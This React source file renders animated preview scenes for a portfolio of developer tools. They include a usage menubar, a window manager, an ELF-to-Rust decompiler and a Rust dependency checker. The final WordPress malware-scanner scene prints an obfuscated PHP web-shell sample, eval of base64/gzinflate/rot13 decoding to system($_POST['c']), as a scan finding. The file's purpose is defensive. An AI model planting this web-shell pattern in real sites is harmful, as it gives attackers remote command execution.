// Animated product scenes shown in the featured-project hover preview.
// Plain HTML + CSS keyframes (see `.scene-*` in styles.css) so they stay crisp at any size.

export function CcbarScene() {
  return <div className="scene scene-ccbar">
    <div className="cc-menubar">
      <span className="cc-app">Terminal</span>
      <span className="cc-menu">Shell</span><span className="cc-menu">Edit</span><span className="cc-menu">View</span>
      <span className="cc-spacer" />
      <span className="cc-pill">
        <span className="cc-num n1">7d 41%</span>
        <span className="cc-num n2">7d 52%</span>
        <span className="cc-num n3">7d 59%</span>
        <span className="cc-num n4">7d 0%</span>
      </span>
      <span className="cc-icon" /><span className="cc-icon" /><span className="cc-clock">9:41</span>
    </div>
    <div className="cc-terminal">
      <div className="cc-dots"><i /><i /><i /></div>
      <p><b>›</b> refactor the parser and add tests</p>
      <p className="dim">Reading src/parser.rs …</p>
      <p className="dim">Editing 3 files …</p>
      <p className="ok">✓ 42 tests passed</p>
      <div className="cc-status"><span>~/project</span><span>main</span><span className="cc-status-pct">7d 59%</span></div>
    </div>
    <div className="cc-dropdown">
      <p className="muted">7-day&nbsp;&nbsp;59%&nbsp;&nbsp;resets Nov 29 11:00 (in 2d 1h)</p>
      <p className="muted">Updated&nbsp;&nbsp;09:41</p>
      <hr />
      <p className="sel">Refresh Now <kbd>⌘R</kbd></p>
      <p>✓ Launch at Login</p>
      <hr />
      <p>Quit CCBar <kbd>⌘Q</kbd></p>
    </div>
    <div className="cc-notification">
      <span className="cc-notif-icon">7d</span>
      <div><strong>Claude Code</strong><span>Your 7-day limit has reset</span></div>
      <span className="cc-notif-time">now</span>
    </div>
  </div>
}

function Window({ kind }: { kind: 'term' | 'web' | 'code' }) {
  if (kind === 'term') return <div className="lw-body lw-term">
    <p><b>$</b> liwin status</p><p className="g">● daemon running · 3 windows</p><p><b>$</b> cargo test</p><p className="g">test result: ok. 128 passed</p><p><b>$</b> <span className="caret" /></p>
  </div>
  if (kind === 'web') return <div className="lw-body lw-web">
    <div className="lw-url">github.com/hina-kura49/liwin</div>
    <div className="lw-hero" /><div className="lw-line w80" /><div className="lw-line w60" /><div className="lw-cards"><i /><i /><i /></div>
  </div>
  return <div className="lw-body lw-code">
    <p><span className="k">fn</span> <span className="f">tile</span>(tree: &amp;<span className="t">Tree</span>) {'{'}</p>
    <p>&nbsp;&nbsp;<span className="k">for</span> node <span className="k">in</span> tree.leaves() {'{'}</p>
    <p>&nbsp;&nbsp;&nbsp;&nbsp;node.<span className="f">place</span>(rect);</p>
    <p>&nbsp;&nbsp;{'}'}</p>
    <p>{'}'}</p>
  </div>
}

export function LiwinScene() {
  return <div className="scene scene-liwin">
    <div className="lw-topbar"><span>Activities</span><span>Wed 9:41</span><span className="lw-tray"><i /><i /><i /></span></div>
    <div className="lw-dock">
      <i className="d1" /><i className="d2" /><i className="d3" /><i className="d4" /><i className="d5" />
      <span className="lw-grid">⋮⋮⋮</span>
    </div>
    <div className="lw-stage">
      <div className="lw-win wa"><div className="lw-title">Terminal</div><Window kind="term" /></div>
      <div className="lw-win wb"><div className="lw-title">Browser</div><Window kind="web" /></div>
      <div className="lw-win wc"><div className="lw-title">Editor</div><Window kind="code" /></div>
    </div>
    <div className="lw-keys">
      <kbd className="k1">Super + Enter</kbd>
      <kbd className="k2">Super + Enter</kbd>
      <kbd className="k3">Super + ←</kbd>
      <kbd className="k4">Super + Shift + →</kbd>
      <kbd className="k5">Super + R</kbd>
    </div>
  </div>
}

export function JotScene() {
  return <div className="scene scene-jot">
    <div className="jt-window">
      <aside className="jt-side">
        <div className="jt-dots"><i /><i /><i /></div>
        <p className="jt-folder">▾ notes</p>
        <p className="jt-page on">Launch plan</p>
        <p className="jt-page">Reading list</p>
        <p className="jt-page">Rust ideas</p>
        <p className="jt-folder">▸ journal</p>
        <p className="jt-folder">▸ research</p>
        <span className="jt-vim">NORMAL</span>
      </aside>
      <main className="jt-doc">
        <p className="jt-path">notes / launch-plan.md</p>
        <h4>Launch plan</h4>
        <blockquote>Plain Markdown. Your folder, your files.</blockquote>
        <p className="jt-check c1"><span className="box" />Write the README</p>
        <p className="jt-check c2"><span className="box" />Record the demo</p>
        <p className="jt-check c3"><span className="box" />Ship v1.0</p>
        <p className="jt-typing"><span className="jt-slash">/</span><span className="caret" /></p>
        <div className="jt-blockmenu">
          <p className="sel">☐&nbsp;&nbsp;Checklist</p><p># &nbsp;Heading</p><p>❝ &nbsp;Quote</p><p>{'{}'} Code block</p>
        </div>
      </main>
    </div>
    <div className="jt-palette">
      <div className="jt-search">⌘K&nbsp;&nbsp;<span>rust</span><span className="caret" /></div>
      <p className="sel">Rust ideas <em>notes/</em></p>
      <p>Rust security notes <em>research/</em></p>
      <p>Toggle Vim mode <em>command</em></p>
    </div>
  </div>
}

export function UnforgeScene() {
  // ELF layout blocks: [label, width %, color]
  const layout: [string, number, string][] = [
    ['ELF', 6, '#f0883e'], ['PHDR', 8, '#ffa657'], ['.text', 34, '#79c0ff'], ['.rodata', 18, '#a5d6ff'],
    ['.data', 10, '#d2a8ff'], ['.dynamic', 9, '#7ee787'], ['SHDR', 15, '#ff7b72'],
  ]
  const cards: [string, string, string][] = [
    ['ok', 'ELF64 · x86-64 · PIE', 'header'],
    ['ok', 'LOAD  r-x  0x020000', 'segment'],
    ['warn', 'e_shnum overflows the file', 'audit'],
  ]
  const asm = ['push   rbp', 'mov    rbp, rsp', 'call   std::env::args', 'cmp    rax, 2', 'jb     .usage', 'call   app::parse']
  const rust: [string, string][] = [
    ['', '<k>fn</k> <f>main</f>() {'],
    ['  ', '<k>let</k> args: <t>Vec</t>&lt;<t>String</t>&gt; = std::env::<f>args</f>().<f>collect</f>();'],
    ['  ', '<k>if</k> args.<f>len</f>() &lt; <n>2</n> {'],
    ['    ', '<m>eprintln!</m>(<s>"usage: app &lt;file&gt;"</s>);'],
    ['    ', '<k>return</k>;'],
    ['  ', '}'],
    ['  ', 'app::<f>parse</f>(&amp;args[<n>1</n>]);'],
    ['', '}'],
  ]
  const html = (code: string) => code.replace(/<(k|f|t|n|s|m)>/g, '<span class="rs-$1">').replace(/<\/(k|f|t|n|s|m)>/g, '</span>')
  return <div className="scene scene-unforge">
    <div className="uf-glow" />
    <div className="uf-phase1">
      <div className="uf-top"><span className="uf-file">target/release/app</span><span className="uf-cmd">unforge elf --strict</span></div>
      <div className="uf-layout">
        {layout.map(([label, width, color], i) => (
          <span key={label} className="uf-block" style={{ width: `${width}%`, '--c': color, '--i': i } as React.CSSProperties}><em>{label}</em></span>
        ))}
      </div>
      <div className="uf-main">
        <div className="uf-hex">
          {Array.from({ length: 7 }, (_, row) => (
            <p key={row}>{Array.from({ length: 8 }, (_, col) => {
              const n = row * 8 + col
              return <span key={col} className={`byte${n === 21 || n === 46 ? ' bad' : ''} t${n % 5}`} style={{ '--i': n } as React.CSSProperties}>{((row * 31 + col * 17 + 0x45) % 256).toString(16).padStart(2, '0')}</span>
            })}</p>
          ))}
        </div>
        <div className="uf-cards">
          {cards.map(([kind, text, tag], i) => (
            <p key={i} className={`uf-card ${kind}`} style={{ '--i': i } as React.CSSProperties}><span className="uf-tag">{tag}</span>{text}</p>
          ))}
        </div>
      </div>
    </div>
    <div className="uf-phase2">
      <div className="uf-goal">Goal · in progress</div>
      <div className="uf-asm">
        <p className="uf-sym"><span className="mangled">_ZN3app4main17h9c1e2f…E</span><span className="demangled">app::main</span></p>
        {asm.map((line, i) => <p key={i} className="uf-asm-line" style={{ '--i': i } as React.CSSProperties}>{line}</p>)}
      </div>
      <div className="uf-to">→</div>
      <pre className="uf-rust">{rust.map(([indent, code], i) => (
        <span key={i} className="uf-rs-line" style={{ '--i': i } as React.CSSProperties}>{indent}<span dangerouslySetInnerHTML={{ __html: html(code) }} />{'\n'}</span>
      ))}</pre>
    </div>
    <div className="uf-badges">
      <span style={{ '--i': 0 } as React.CSSProperties}>#![forbid(unsafe_code)]</span>
      <span style={{ '--i': 1 } as React.CSSProperties}>0 panics</span>
      <span style={{ '--i': 2 } as React.CSSProperties}>zero-copy</span>
      <span style={{ '--i': 3 } as React.CSSProperties}>fuzzed</span>
    </div>
  </div>
}

export function CheckScene() {
  const rows: [string, string, string, string][] = [
    ['mal', '悪性', 'faster_log 1.7.8', 'MAL-2025-xxxx · 削除済み'],
    ['vul', '脆弱性', 'time 0.1.45', 'RUSTSEC-2020-0071 → 0.2.23 で修正'],
    ['name', '名前の注意', 'serde-rs 0.1.0', 'serde に似た名前'],
    ['info', '情報', 'atty 0.2.14', 'unmaintained'],
  ]
  return <div className="scene scene-check">
    <div className="gh-header"><span className="gh-mark" /><span className="gh-crumb"><span>your-org /</span> <b>your-app</b></span><span className="gh-search" /></div>
    <div className="gh-tabs"><span>Code</span><span>Issues</span><span className="on">Pull requests</span><span>Actions</span><span>Security</span></div>
    <div className="ck-pr">
      <div className="ck-pr-head"><span className="ck-badge">Open</span><strong>Bump dependencies</strong><span className="ck-num">#42</span></div>
      <div className="ck-checks">
        <p className="ck-run"><span className="ck-spin" />RustSecJP check — Cargo.lock を確認中…</p>
        <p className="ck-fail">✕ RustSecJP check — 悪性の crate が 1 件</p>
      </div>
      <div className="ck-comment">
        <p className="ck-who"><span className="ck-avatar" />rustsecjp-check <em>bot</em></p>
        <p className="ck-title">依存 214 件を確かめました</p>
        {rows.map(([kind, label, krate, note], i) => (
          <p key={kind} className={`ck-row ${kind}`} style={{ '--i': i } as React.CSSProperties}>
            <span className="ck-label">{label}</span><code>{krate}</code><span className="ck-note">{note}</span>
          </p>
        ))}
        <p className="ck-foot">RustSecJP の記録・OSV をもとに確認 · ビルドもコードの実行もしていません</p>
      </div>
    </div>
  </div>
}

export function TrailScene() {
  const points: [string, string, string][] = [
    ['09:12', 'commit', 'Add session store'],
    ['09:40', 'edit', 'src/auth/service.ts'],
    ['10:05', 'checkout', 'feat/login → main'],
    ['10:21', 'edit', 'src/auth/token.ts'],
    ['10:48', 'commit', 'Refresh tokens on expiry'],
  ]
  return <div className="scene scene-trail">
    <div className="tr-term">
      <p className="tr-cmd"><b>$</b> trail review --since push</p>
      <div className="tr-cols">
        <ol className="tr-timeline">
          {points.map(([time, kind, text], i) => (
            <li key={i} className={`tr-pt ${kind}`} style={{ '--i': i } as React.CSSProperties}>
              <span className="tr-dot" /><span className="tr-time">{time}</span><span className="tr-kind">{kind}</span><span className="tr-text">{text}</span>
            </li>
          ))}
        </ol>
        <div className="tr-diff">
          <p className="tr-file">src/auth/token.ts</p>
          <p className="ctx">  export function refresh(t: Token) {'{'}</p>
          <p className="del">-   if (t.expired) throw new Error()</p>
          <p className="add">+   if (t.expired) return renew(t)</p>
          <p className="add">+   schedule(t.expiresAt)</p>
          <p className="ctx">  {'}'}</p>
        </div>
      </div>
    </div>
  </div>
}

export function WpwareScene() {
  const files = [
    'wp-admin/about.php',
    'wp-admin/includes/file.php',
    'wp-includes/load.php',
    'wp-includes/version.php',
    'wp-content/plugins/contact-form-7/wp-contact-form-7.php',
    'wp-content/themes/twentytwentyfive/functions.php',
    'wp-content/uploads/2024/01/cache.ico',
    'wp-content/uploads/2024/01/photo.jpg',
    'wp-login.php',
    'xmlrpc.php',
  ]
  const layers: [string, string][] = [
    ['raw', "@eval(str_rot13(gzinflate(base64_decode('7Vh9b9s2…'))));"],
    ['l1', 'base64_decode → 0x8d 0x52 0xcb …'],
    ['l2', "gzinflate → flfgrz($_CBFG['p']);"],
    ['l3', "str_rot13 → system($_POST['c']);"],
  ]
  return <div className="scene scene-wpware">
    <div className="wpw-term">
      <p className="wpw-cmd"><b>$</b> wpware scan /var/www/html</p>
      <div className="wpw-cols">
        <div className="wpw-files">
          <ol className="wpw-list">
            {[...files, ...files].map((f, i) => (
              <li key={i} className={f.endsWith('cache.ico') ? 'bad' : f === 'wp-includes/load.php' ? 'mod' : ''}>
                <span className="wpw-mark" />{f}
              </li>
            ))}
          </ol>
        </div>
        <div className="wpw-right">
          <div className="wpw-deobf">
            <p className="wpw-label">ほどく（実行しない）</p>
            {layers.map(([kind, code], i) => (
              <p key={kind} className={`wpw-layer ${kind}`} style={{ '--i': i } as React.CSSProperties}><code>{code}</code></p>
            ))}
          </div>
          <div className="wpw-result">
            <p className="wpw-head"><span className="wpw-sev">重大</span>wp-content/uploads/2024/01/cache.ico</p>
            <p className="wpw-title">復号した文字列をそのまま実行</p>
            <p className="wpw-line">3 段の難読化をほどくと <code>system($_POST['c'])</code> になります</p>
            <p className="wpw-next">次にすること: 消す前にバックアップとアクセスの記録を保存し、専門家に相談</p>
          </div>
        </div>
      </div>
    </div>
  </div>
}
